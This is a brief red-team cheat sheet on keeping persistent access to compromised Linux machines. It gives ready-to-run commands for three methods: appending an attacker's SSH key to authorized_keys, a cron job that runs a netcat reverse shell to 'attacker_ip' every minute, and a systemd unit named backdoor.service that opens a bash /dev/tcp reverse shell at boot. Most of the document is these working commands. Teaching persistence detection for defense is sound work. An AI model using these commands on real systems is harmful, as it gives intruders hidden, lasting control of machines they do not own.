# Persistence - Linux

This section covers common techniques for establishing persistence on Linux systems, ensuring continued access to a compromised machine.

## Linux Persistence

Persistence consists of techniques that adversaries use to maintain their foothold in a compromised environment. Adversaries may also use these techniques to maintain access to systems, even if the system is rebooted or credentials are changed.

*   **SSH Authorized Keys:** Adding an attacker's public SSH key to the `~/.ssh/authorized_keys` file of a user allows for passwordless SSH login, providing persistent access.
    ```bash
    echo "ssh-rsa AAAAB3NzaC..." >> ~/.ssh/authorized_keys
    ```
    *Replace `AAAAB3NzaC...` with the attacker's actual public SSH key.*

*   **Cron Jobs:** Cron is a time-based job scheduler in Unix-like operating systems. Adversaries can create new cron jobs to execute malicious scripts or commands at regular intervals, maintaining persistence.
    ```bash
    (crontab -l; echo "* * * * * nc -e /bin/bash attacker_ip 4444")|crontab -
    ```
    This command adds a new cron job that executes a reverse shell every minute. *Replace `attacker_ip` with the attacker's IP address.*

*   **Systemd Services:** Systemd is a system and service manager for Linux. Adversaries can create custom systemd service units to execute malicious payloads at system startup or when certain conditions are met.
    ```bash
    # Example /etc/systemd/system/backdoor.service
    [Unit]
    Description=My Backdoor Service
    After=network.target

    [Service]
    ExecStart=/bin/bash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"
    Restart=always

    [Install]
    WantedBy=multi-user.target
    ```
    *Save the above content to a file like `/etc/systemd/system/backdoor.service`.*

    Then enable and start the service:
    ```bash
    systemctl enable backdoor.service
    systemctl start backdoor.service
    ```
    This creates a service that provides a persistent reverse shell. *Replace `attacker_ip` with the attacker's IP address.*

These techniques provide various methods for maintaining access to compromised Linux systems, crucial for long-term red team engagements.

